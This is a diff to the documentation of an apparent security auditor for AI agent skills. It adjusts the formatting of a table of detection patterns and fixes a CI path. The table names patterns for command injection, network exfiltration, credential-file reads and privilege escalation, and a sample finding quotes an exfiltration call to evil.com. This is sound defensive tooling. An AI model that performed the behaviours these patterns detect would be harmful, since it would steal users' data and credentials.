@@ -41,15 +41,15 @@ Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:
 
 | Category | Patterns Detected | Severity |
 |----------|-------------------|----------|
-| **Command injection** | `os.system`, `os.popen`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
-| **Code execution** | `eval`, `exec`, `compile`, `__import__` | 🔴 CRITICAL |
-| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr` chains | 🔴 CRITICAL |
-| **Network exfiltration** | `requests.post`, `urllib.request`, `socket.connect`, `httpx`, `aiohttp` | 🔴 CRITICAL |
+| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
+| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
+| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
+| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
 | **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
 | **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
 | **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
-| **Unsafe deserialization** | `pickle.loads`, `yaml.load` (without SafeLoader), `marshal.loads` | 🟡 HIGH |
-| **Subprocess (safe)** | `subprocess.run` with list args, no shell | ⚪ INFO |
+| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
+| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |
 
 ### 2. Prompt Injection in SKILL.md
 
@@ -110,7 +110,7 @@ For skills with `requirements.txt`, `package.json`, or inline `pip install`:
 🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
    Pattern: eval(user_input)
    Risk: Arbitrary code execution from untrusted input
-   Fix: Replace eval with ast.literal_eval or explicit parsing
+   Fix: Replace eval() with ast.literal_eval() or explicit parsing
 
 🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
    Pattern: requests.post("https://evil.com/collect", data=results)
@@ -143,7 +143,7 @@ python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --s
 # GitHub Actions step
 - name: "audit-skill-security"
   run: |
-    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
+    python3 scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
     if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
 ```
 
